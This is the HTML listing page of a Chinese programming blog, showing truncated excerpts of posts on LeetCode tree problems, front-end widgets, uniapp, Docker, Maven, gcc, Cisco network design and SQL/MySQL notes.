<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f4934b5ca2d5c55318e2181d3890c7e/" rel="bookmark">
			LeetCode 530二叉搜索树的绝对搜索差 501二叉搜索树中的众数 236二叉树的最近公共祖先 | 代码随想录25期训练营day21
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LeetCode 530 二叉搜索树的绝对搜索差 2023.11.14 题目链接代码随想录讲解[链接]
class Solution { public: //双指针做法，中序遍历 int min = INT_MAX; TreeNode* pre; void traversal(TreeNode* cur) { if(cur == NULL) return; traversal(cur-&gt;left); if(pre != NULL &amp;&amp; abs(cur-&gt;val - pre-&gt;val) &lt; min) min = abs(cur-&gt;val - pre-&gt;val); pre = cur; traversal(cur-&gt;right); } int getMinimumDifference(TreeNode* root) { //直接做法，把树值存入一个数组，给数组排序然后判断最小值 // vector&lt;int&gt; num; // queue&lt;TreeNode*&gt; que; // que.push(root); // while (!que.empty()) // { // int size = que.size(); // while (size--) // { // TreeNode* node = que.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f4934b5ca2d5c55318e2181d3890c7e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba5d237489fcbc24b75655bd99d4faf9/" rel="bookmark">
			LayUI 日期控件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 &lt;input type="text" id="datePicker" class="layui-input"&gt; &lt;script src="https://cdn.staticfile.org/layui/2.6.8/layui.js"&gt;&lt;/script&gt; &lt;script&gt; // 使用 layui 的日期控件 layui.use('laydate', function(){ var laydate = layui.laydate; // 执行一个laydate实例 laydate.render({ elem: '#datePicker', //指定元素 format: 'yyyy-MM-dd', //日期格式 theme: 'molv' //设定主题 }); }); &lt;/script&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/429070288ea938d65a52157b7f1b9c48/" rel="bookmark">
			保姆级前端翻牌效果(CSS)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果 翻牌效果
hover 时候
代码直接上 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .card{ margin: 30px auto; margin-top: 150px; width: 500px; height: 500px; perspective: 800px; } .front, .back{ width: 100%; height: 100%; border-radius: 20px; position: absolute; backface-visibility: hidden; transition: all 1s cubic-bezier(0.7,0,0.3,1.5); background-size: contain; } .card:hover .front{ transform: rotateY(180deg); } .card:hover .back{ transform: rotateY(0deg); } .front{ background: url(./1699939478452.png); } .back{ background: url(./1699939494340.png); transform: rotateY(180deg); } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/429070288ea938d65a52157b7f1b9c48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d29a096715599be329e4402d9d41491e/" rel="bookmark">
			eclipse导入idea项目Context root cannot be empty问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天用eclipse导入idea的一个项目 打开web project setting 一直提示Context root cannot be empty
然后找了网上很多教程 都说要改什么setting的文件 改了也没用
最后比较其它没问题的工程，发现在Project属性-&gt; Project Natures配置 缺少了Web Properties，add里面添加然后应用一下。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b676adc8caa064e9f1cc7479e82a110/" rel="bookmark">
			vue中使用monaco-editor(代码编辑器)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装
npm i monaco-editor 2、webpack项目配置
借助monaco-editor-webpack-plugin插件，它会帮我们做这么⼏件事
⾃动注⼊getWorkerUrl全局变量处理worker的编译配置⾃动引⼊控件和语⾔包 安装依赖
npm install monaco-editor-webpack-plugin -S 修改vue.config.ts
const MonacoWebpackPlugin = require('monaco-editor-webpack-plugin') module.exports = { // other configurations configureWebpack: { plugins: [ new MonacoWebpackPlugin({ languages: ['javascript', 'css', 'html', 'typescript', 'json'] // available options are documented at https://github.com/Microsoft/monaco-editor-webpack-plugin#options // features:["coreCommands","find"] }) ] } } 3、使用
&lt;div ref="monacoRef" style="width: 100%; height: 300px"&gt;&lt;/div&gt; &lt;script setup&gt; import { onMounted, reactive, ref, watch, nextTick, toRaw } from 'vue'; import * as monaco from 'monaco-editor'; const monacoEditor = ref(); const monacoRef = ref(); const monacoParams = { theme: 'vs-dark', // 主题 value: '', // 默认显示的值 language: 'json', folding: true, // 是否折叠 foldingHighlight: true, // 折叠等高线 foldingStrategy: 'indentation', // 折叠方式 auto | indentation showFoldingControls: 'always', // 是否一直显示折叠 always | mouseover disableLayerHinting: true, // 等宽优化 emptySelectionClipboard: false, // 空选择剪切板 selectionClipboard: false, // 选择剪切板 automaticLayout: true, // 自动布局 codeLens: false, // 代码镜头 scrollBeyondLastLine: false, // 滚动完最后一行后再滚动一屏幕 colorDecorators: true, // 颜色装饰器 accessibilitySupport: 'off', // 辅助功能支持 "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b676adc8caa064e9f1cc7479e82a110/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca372acc790604c730a9762a5d37ff21/" rel="bookmark">
			Flutter 加载3D模型方案总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、flutter_cube1.依赖2.使用 二、model_viewer_plus1.依赖2.配置2.使用 三、结合three.js1. 配置three.js下载资源编写index.html 2. 导入Flutter项目引入资源声明资源 3. Flutter中使用依赖配置使用 总结 前言 本文主要是对pub上的3D库使用总结及Flutter中结合three.js总结
一、flutter_cube Flutter 3D 小部件，加载OBJ模型文件
支持Android，IOS，Window，Mac平台
1.依赖 flutter_cube: ^0.1.1 2.使用 import 'package:flutter/material.dart'; import 'package:flutter_cube/flutter_cube.dart'; class Model3DViewer extends StatefulWidget { final String name; const Model3DViewer({Key? key, required this.name}) : super(key: key); @override State&lt;Model3DViewer&gt; createState() { return _Model3DViewerState(); } } class _Model3DViewerState extends State&lt;Model3DViewer&gt; { @override Widget build(BuildContext context) { return Cube(onSceneCreated: _onSceneCreated); } void _onSceneCreated(Scene scene) { scene.camera.position.z = 10; scene.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca372acc790604c730a9762a5d37ff21/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3f6ba43854c75d8e9aac1448d644d0a/" rel="bookmark">
			uniapp系列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MQTT： 1、报错：TypeError: WebSocket is not a constructor 背景：最近使用MQTT协议传递消息，集成在uniapp上，出现此问题
解决：app端需要用"wx://"（安全协议用"wxs://"），H5端才是用"ws://"（安全协议用"wss://"），
2、报错：n.createConnection is not a function/net.createConnection is not a function 解决：降低版本至 4.1.X以下
下载地址：
https://unpkg.com/mqtt@4.1.0/dist/mqtt.min.js
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9d1fcd216275fc80374702884bda1a5/" rel="bookmark">
			数字人部署之VITS&#43;Wav2lip数据流转处理以提高实时性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、模型
VITS模型训练教程VITS-从零开始微调（finetune）训练并部署指南-支持本地云端
Wav2lip是2D数字人，可参考训练嘴型同步模型Wav2Lip
PS:以上模型都是开源可用。
二. VITS数据处理问题
VITS模型的输出为一维的numpy类型数据，官方开源代码中给出的处理方法为使用scipy.io.wavfile提供将numpy数据采样并存为音频文件，代码示例为 if language is not None: text = language_marks[language] + text + language_marks[language] speaker_id = speaker_ids[spk] stn_tst = get_text(text, hps, False) with no_grad(): x_tst = stn_tst.unsqueeze(0).to(device) x_tst_lengths = LongTensor([stn_tst.size(0)]).to(device) sid = LongTensor([speaker_id]).to(device) audio = net_g.infer(x_tst, x_tst_lengths, sid=sid, noise_scale=noise_scale, noise_scale_w=noise_scale_w, length_scale=1.0 / length)[0][0, 0].data.cpu().float().numpy() del stn_tst, x_tst, x_tst_lengths, sid wavf.write(str(output_dir)+"/"+output_name+".wav",hps.data.sampling_rate,audio) 但是如果要将该模型作为数字人的音频克隆输出，上述代码的保存方式对于实时性形成较大阻碍，我们应该考虑如何不写入文件直接传输到如Web前端进行播放音频。经过思考，若前端使用如下代码解析音频,
&lt;div&gt; &lt;audio id="audio" controls autoplay style="display: none;"&gt;&lt;/audio&gt; &lt;/div&gt; const audioEl = document.querySelector('audio') audioEl.src= "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f9d1fcd216275fc80374702884bda1a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1fba5798cfd4fc3fde2f8328a1161694/" rel="bookmark">
			VScode远程连接错误:进程试图写入不存在的管道
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用VScode连接树莓派时，出现远程连接错误：进程试图写入不存在的管道
解决方案：
（1）可以进入config所在文件夹，删除文件
（2）无法解决的化尝试下述方法
输入 Remotting-SSH:Settings 进入设置
将绝对文件路径添加到自定义SSH配置文件(C：\Users{用户名}..。
ssh\config)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c04d2c7b7dc555c62b3429095b3c1255/" rel="bookmark">
			欧空局网站关闭/停止服务，最新哨兵数据（Sentinel）下载网址及教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
背景
一、注册
二、数据下载
三、问题汇总
背景 欧空局网站即将关闭（2023年10月底），因此需要转到新的下载地址：
https://dataspace.copernicus.eu/
一、注册 #可能加载有点慢，需要科学上网
（1）点击右上角小绿按键“LOGIN”
（2）点击右下角小绿按键“REGISTER”
（3）带*为必填项，其余注意事项如图所示
（4）到注册邮箱里面确认一下，之后重新进页面即可
（5）点击“LOGIN”
（6）点击“Copernicus Browser”
二、数据下载 （1）登陆界面
（2）研究区选择
——第2-第4主要为面、线、点研究区选择
——点击最右侧研究区选择工具，然后点击“画笔”，在感兴趣区域进行绘制
（2）数据选择
（3）加入购物车
或者直接选择一个轨道，相应的影像全部加载，相关结果下载同上
三、问题汇总 1.关于下载位置在哪里？
答：在浏览器默认下载地址，只有下载完成才能看到文件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d20ac56396f684f47f491d1cea88a943/" rel="bookmark">
			解决uni.navigateTo无法跳转问题，使用uni.reLaunch清理页面栈堆积过多导致无法跳转的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题起因
开发了一个洗鞋小程序的上架段，里面有代客户下单功能，
发现代客下单2次后， 无法再点击跳转下单页面
找了一堆问题，也测试了：
uni.navigateTo({ url: '/pages/index/confirmOrder/confirmOrder?id=' + id }) .then(() =&gt; { // 页面跳转成功的处理 console.log('跳转成功'); }) .catch((error) =&gt; { // 捕捉异步错误并进行处理 console.error('导航到页面发生错误:', error); }); 结果输出的是跳转成功， 就很奇怪，
再排查后 发现调整的页面层次太多。
在小程序开发中，页面栈堆积过多导致无法跳转新页面通常是因为小程序页面栈的限制。小程序的页面栈有一定的深度限制，当超过这个限制时，会出现类似的问题。
以下是一些解决方法：
优化页面栈使用： 确保在不需要的时候关闭页面，及时释放页面资源。尽量避免将不必要的页面推入栈中，以减少栈的深度。
使用 uni.reLaunch 或 uni.redirectTo： 如果你的业务场景允许，可以考虑使用 uni.reLaunch 或 uni.redirectTo 替代 uni.navigateTo。这两个方法可以关闭当前所有页面或替代当前页面，从而避免页面栈过深。
// 使用 uni.reLaunch 替代 uni.navigateTo uni.reLaunch({ url: '/pages/your-page' }); // 使用 uni.redirectTo 替代 uni.navigateTo uni.redirectTo({ url: '/pages/your-page' }); 清理页面栈： 在某些情况下，你可能需要清理页面栈，只保留最基础的页面。你可以使用 uni.reLaunch 或 uni.redirectTo 结合小程序的路径规划，将用户导航到新的起始页面。
// 清理页面栈并跳转到新的起始页面 uni.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d20ac56396f684f47f491d1cea88a943/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb4edd060646b8202f459439b384ea9a/" rel="bookmark">
			使用 maven 自动将源码打包并发布
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 maven-source-plugin 作用：
在构建过程中将项目的源代码进行打包，并作为一个jar文件附着在主构件上，在 pom.xml 中添加如下内容，使用 maven 生成 jar 的同时生成 sources 包
在 pom 中配置如下：
&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;!-- 绑定source插件到Maven的生命周期，并在生命周期后执行绑定的source的goal --&gt; &lt;executions&gt; &lt;execution&gt; &lt;!-- 绑定source插件到Maven的生命周期 --&gt; &lt;id&gt;attach-sources&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;!--在生命周期后执行绑定的source插件的goals --&gt; &lt;goals&gt; &lt;goal&gt;jar-no-fork&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;phase&gt;package&lt;/phase&gt; 表示配置的插件在 Maven 构建的打包阶段执行maven-source-plugin 提供项目自动将源码打包并发布的功能，在需要发布源码项目的 pom.xml 文件中添加即可 执行 mvn install，maven会自动将source install到repository 执行 mvn deploy，maven会自动将source deploy到remote-repository mvn source:jar，单独打包源码 &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;attach-sources&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;jar&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; 注意：在多项目构建中，将 source-plugin 置于顶层或 parent 的 pom 中并不会发挥作用，须置于具体项目的pom中 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d48572609c910bb7d4678e49c0c8d54/" rel="bookmark">
			gcc编译器与Makefile入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Windows下开发通常使用各种IDE，但在Linux下进行C编程编译代码的话需要用到GCC编译器。
一、编译流程 GCC 编译器的编译流程是：预处理、编译、汇编和链接。预处理就是展开所有的头文件、替换程序中的宏、解析条件编译并添加到文件中。编译是将经过预编译处理的代码编译成汇编代码，也就是我们常说的程序编译。汇编就是将汇编语言文件编译成二进制目标文件。链接就是将汇编出来的多个二进制目标文件链接在一起，形成最终的可执行文件。
新建一个文件用gcc编译：
新建一个c_practice文件夹，在此文件夹下用vim编辑器新建一个main.c文件
提示没有vim编辑器，安装一下，再使用vim main.c命令编辑代码：
发现vim编辑器没有行号，设置一下，打开/etc/vim/vimrc文件，在文件最下面一行加上：set nu（记得使用管理员权限sudo vim vimrc，不然有可能没有写的权限），以及tab键首行缩进有8空格，同样用set ts=4修改一下
写一个helloworld
编译main.c文件使用命令如下
gcc main.c 编译器提示错误
修改后再编译可以看到文件夹中多出了a.out文件，这是刚刚编译生成的可执行文件，这是编译器自动命名的，使用./a.out运行下看看
想要指定可执行文件的名字的话，使用-o参数，如
gcc main.c -o main 二、多文件编译 main.c代码如下
1 #include &lt;stdio.h&gt; 2 #include "input.h" 3 #include "calcu.h" 4 5 void main() 6 { 7 int a, b, num; 8 9 input_int(&amp;a, &amp;b); 10 num = calcu(a, b); 11 printf("%d + %d = %d\r\n", a, b, num); 12 input.c文件代码：
1 #include &lt;stdio.h&gt; 2 #include "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d48572609c910bb7d4678e49c0c8d54/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e99de32ac7701eb30a31adc5e18ef66/" rel="bookmark">
			C#上位机单片机调试上位机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 项目简介1、主要功能2、软件功能设计0x00命令0x01命令0x02命令0x03命令0x04命令0x05命令0x06~0x080x100x110x120x130x200x210x22 一、界面二、程序设计未完待续 项目简介 1、主要功能 1.可以升级下位机程序 2.可以配置下位机的某些参数 3.可以接收下位机数据并可视化显示出来 4.可以接收下位机输出的日志信息，并可以保存下来 5.下位机可能会记录存储某些数据，上位机可以读取并显示出来 6.上位机需要具备完整的操作提示和错误提示 2、软件功能设计 物理层需使用UART或232的全双工通讯，同时规定数据如果没有特殊标注都使用小端模式传输（低字节在前高字节在后）。
在上一章中使用了比较通用的Modbus协议和下位机进行通讯，这一章将通过自定义的协议实现一个这个调试上位机。
协议格式如下：
帧头命令标识数据个数数据校验2Byte1ByteN个ByteN个Byte1Byte0xAAAA0~0xff异或校验数据长度使用varint编码 命令标识定义如下：
0x00命令 此命令标识只能由下位机向上位机发送，上位机无需回复，功能为监控数据，数据段包含两个4个字节的整型数据，同时为节省带宽使用varint编码
一个字节的0~6bit为数据，第7个bit为是否需要向下解析，如下示例：
第一个数据为1，第二个数据为500，那么发送数据为：
帧头命令标识数据个数数据校验0~1字节2字节3字节4~6字节7字节0xAA,0xAA0x000x030x01,0xF4,0x030x00 第一个数据为500，第二个数据为60000，那么发送数据为：
帧头命令标识数据个数数据校验0~1字节2字节3字节4~8字节9字节0xAA,0xAA0x000x050xF4,0x03,0xE0,0xD4,0x030x00 0x01命令 上位机向下位机发送此命令查询下位机当前运行的程序状态：
帧头命令标识数据个数数据校验0~1字节2字节3字节无4字节0xAA,0xAA0x010x00无0x00 下位机回复：
帧头命令标识数据个数数据校验第0~1字节第2字节第3字节第4字节第5字节0xAA,0xAA0x010x010x00：当前运行在boot中，0x01：运行在app中0x00 0x02命令 上位机向下位机发送此命令控制下位机跳转boot或app
帧头命令标识数据个数数据校验0~1字节2字节3字节4字节5字节0xAA,0xAA0x020x010x00：跳转到App，0x01：跳转到Boot0x00 下位机回复：
帧头命令标识数据个数数据校验第0~1字节第2字节第3字节第4字节第5字节0xAA,0xAA0x020x010x00：成功，其他失败0x00 0x03命令 上位机向下位机发送此命令或取下位机app软件版本号
上位机数据：无
下位机数据：3个字节版本号
0x04命令 上位机向下位机发送此命令通知下位机app程序开始升级，下位机收到命令后进行升级前的初始化操作
上位机数据：4个字节的文件大小
下位机数据：0:成功，其他失败
0x05命令 上位机向下位机发送app程序升级文件数据
上位机数据：N个字节，前4个字节为文件的偏移
下位机数据：5个字节，第一个字节为错误码：0：成功，1：Flash写入失败，2：偏移错误（后面4个字节为正确的偏移），3：还未接收到文件信息
0x06~0x08 0x03到0x05为仅在boot中支持的升级app程序用到的指令，0x06~0x08为仅在app中支持的升级boot程序用到的指令
0x10 上位机获取下位机配置数量，同时下位机接收到命令将把读取索引设置到开头
上位机数据：无
下位机数据：2个字节，当前设备的配置数量
0x11 上位机获取下位机配置，同时下位机每反回一条索引向后加1
上位机数据：无
下位机数据：N个字节，格式为，Key:Value，Key为配置名称，Value为值
0x12 上位机设置下位机配置
上位机数据：N个字节，格式为，Key:Value，Key为配置名称，Value为值
下位机数据：0：成功，其他失败
0x13 时间同步
上位机数据：4个字节，当前时间戳
下位机数据：0：成功，其他失败
0x20 上位机获取下位机事件记录条数
上位机数据：8个字节，前4字节开始时间戳，后4字节结束时间戳
下位机数据：4个字节，当前设备的记录条数
0x21 上位机获取下位机事件记录条数，同时启动传输，通过0x22命令
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e99de32ac7701eb30a31adc5e18ef66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cea78317824f721f4c7542410d24898f/" rel="bookmark">
			Cisco Packet Tracer 典型校园网搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		该文章拓扑加配置文档下载链接：Cisco Packet Tracer 典型校园网设计 目录
摘要
一、校园网设计与网络规划配置
（一）子网划分
（二）VLAN 划分
二、需求分析
（一）路由配置需求
（二）WIFI 网络配置需求
（三）NAT 外网访问需求
（四）VPN 访问内网
（五）路由器双机热备 HSRP需求
（六）最小生成树协议 STP需求
（七）ACL 访问控制需求
（八）HTTP、DNS 和邮件服务器配置需求
三、网络配置过程
（一）二层和三层交换机VLAN的配置
（二）DHCP配置
（三）交换机路由器接口IP配置
（四）OSPF路由器配置和静态路由配置
（五）WIFI网络配置
（六）NAT外网访问配置
（七）VPN访问内网配置
（八）交换机双击热备HSRP
（九）链路聚合配置
（十）最小生成树协议STP
（十一） ACL访问控制
（十二）HTTP、DNS和邮件服务器配置
摘要 这是一个基于中小型校园网的网络搭建设计，使用Packet Tracer模拟器实现网络配置，并应用多种关键技术。其中，使用了VLAN技术实现了学校部门间的网段隔离；使用链路聚合提高了核心层的网络带宽与稳定性；使用RSTP提高了网络的故障切换速度，并避免了网络环路和广播风暴；使用思科的HSRP协议实现了网关的冗余性；配置ACL访问控制技术，限制了部门间网络的互访；配置NAT技术解决了内网主机上网和公网地址不够用的问题；配置OSPF动态路由和缺省引入，实现了内网的网络互通和访问互联网的路由转发问题；并在网络拓扑中配置了无线路由器，提供了校园网的无线终端WIFI上网功能。
一、校园网设计与网络规划配置 （一）子网划分 AAU 大学拟建设一个校园网基础设施，校园网使用 172.16.0.0/20 网络进行划分，请根据具体需求完成各网络 IP 地址划分:
1、出口网络：校园网用 10Gbps 的 POS 技术与 Internet 相连，POS 接口的帧格式是 SDH，申请到的出口 IP 地址为 200.10.1.1/2，连接 ISP 路由器 IP 地址为 200.10.1.2/2。
2、行政区：共 200 台计算机。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cea78317824f721f4c7542410d24898f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21f63b9933f3fa3f9c9b7f7823c774ac/" rel="bookmark">
			Docker的安装配置与使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、docker安装与启动 首先你要保证虚拟机所在的盘要有至少20G的空间，因为docker开容器很吃空间的，其次是已经安装了yum依赖
yum install -y epel-release yum install docker-io # 安装docker 配置文件 /etc/sysconfig/docker chkconfig docker on # 加入开机启动 service docker start # 启动docker服务 基本信息查看 docker version # 查看docker的版本号，包括客户端、服务端、依赖的Go等 docker info # 查看系统(docker)层面信息，包括管理的images, containers数等 2.镜像的获取与容器的使用 搜索镜像 docker search &lt;image&gt; # 在docker index中搜索image 下载镜像 docker pull &lt;image&gt; # 从docker registry server 中下拉image 查看镜像 docker images： # 列出images docker images -a # 列出所有的images（包含历史） docker rmi &lt;image ID&gt;： # 删除一个或多个image 使用镜像创建容器 docker run -i -t sauloal/ubuntu14.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21f63b9933f3fa3f9c9b7f7823c774ac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a58faddd040d403f89791d4b8a14961/" rel="bookmark">
			通过百度翻译API完成Java中的中英文翻译
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		因为要做英文文献索引分词，所以对于索引词汇必须得是英文，将表中的中文都转换成英文
这里用到百度的翻译API
首先需要注册成为百度翻译开发者：百度翻译开放平台
注册成为个人开发者就可以，
这里可以完善相关信息，要记住的包括APPID和密钥，这里最好不要填服务器地址，不然会报错
这里可以查看到具体请求的细节
具体代码如下：
public class test { public static void main(String[] args) { try { String apiKey = "xxxxxxxxxx"; String sourceText = "4-羟基-3-甲氧基苯基 O-β-D-吡喃葡萄糖基-(1→6)-O-β-D-吡喃葡萄糖基-(1→6)-β-D-吡喃葡萄糖苷"; String appId="xxxxxxx"; String encodedText = URLEncoder.encode(sourceText, "UTF-8"); String url = "http://api.fanyi.baidu.com/api/trans/vip/translate?q="+encodedText+"&amp;from=zh&amp;to=en&amp;appid=" + appId + "&amp;salt=1435660288&amp;sign=" + md5(appId + sourceText + "1435660288" + apiKey); HttpClient client = HttpClientBuilder.create().build(); HttpGet request = new HttpGet(url); HttpResponse response = client.execute(request); BufferedReader reader = new BufferedReader(new InputStreamReader(response.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9a58faddd040d403f89791d4b8a14961/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/177c157d63b924cb26389215eb455421/" rel="bookmark">
			实际开发中常用的SQL
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、获取时间
获取星期
select to_char(sysdate,'day') dayth from dual 获取上月 月份
select to_char(ADD_MONTHS(trunc(sysdate), -1),'yyyymm') from dual 获取上月1号
select trunc(add_months(sysdate,-1),'mm') first_day from dual; 2、Oracle行转列
listagg(string1,'|') within group (order by string) start_time； 3、字符串替换
replace('he love you','he','i') 替换结果i love you
4、字符串截取
substr('13088888888',3,8)从第3位开始，截取8位，截取子字符串08888888
5、时间与字符串转换
to_char(时间，‘yyyy/mm/dd hh24’)显示到小时
to_date(时间,'时间格式') 6、处理字段为空的问题
在实际应用中，涉及到字段的计算。一个字段为null时，与其他字段的加减乘除结果都为null
nvl (expr1, expr2) 若expr1为null，就返回expr2，若expr1不能为null就返回expr1
nvl(字段,0) 若字段为空，返回0.
select coalesce(comm,0) from emp.将comm列中为null的值替换成0
select case when comm is not null then comm else 0 end from emp 将comm列中为null的值替换成0 7、decode函数
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/177c157d63b924cb26389215eb455421/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0ea3a6c7d7f2b6b948f6ecb92fcee72/" rel="bookmark">
			mysql知识点（自用）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、定位慢查询
二、sql执行计划
三、索引
1、存储引擎
2、索引底层数据结构
3、聚簇和非聚簇索引
4、索引创建原则
5、索引失效场景
四、sql优化经验
五、事务相关
1、事务特性
2、隔离级别
3、MVCC
六、主从同步原理
七、分库分表
一、定位慢查询 项目中，开发环境中mysql配置慢查询日志了(slow_query_log为开启慢查询日志的开关，1为开启，0为关闭。long_query_time为慢查询的阈值时间，单位为秒，默认情况下为10秒)。
定位到查询较慢的sql，通过mysql的explan分析工具，分析慢查询
二、sql执行计划 1、通过key、key_len字段判断查询过程中是否命中索引，避免索引失效的情况。
key：当前sql命中的索引
key_len：命中索引的大小
2、通过type字段判断sql是否有优化控件
判断sql性能，性能从好到差为：null、system（查询系统表）、const（主键查询）、eq_ref（主键索引或唯一索引）、ref(索引查询)、range(范围查询)、index（索引树查询）、all(全盘扫描)
3、通过extra建议判断，此次查询是否出现回表查询的情况，考虑是否通过添加索引或者修改查询字段来优化sql
using index condition: 进行了回表查询
三、索引
1、存储引擎 innodb和myisam引擎
innodb为行锁定，支持事务处理和外键约束等功能，能够保证数据的完整性和一致性。InnoDB叶子节点存储的是整个数据行所有的数据。
myisam为表级锁定和高速读取。MyISAM的索引和数据是分开存储的，因此索引查找的时候，MyISAM的叶子节点存储的是数据所在的地址，而不是数据。
2、索引底层数据结构 索引底层数据结构为B+树结构。非叶子节点只用于索引，叶子节点为双向链表的结构，存储数据。
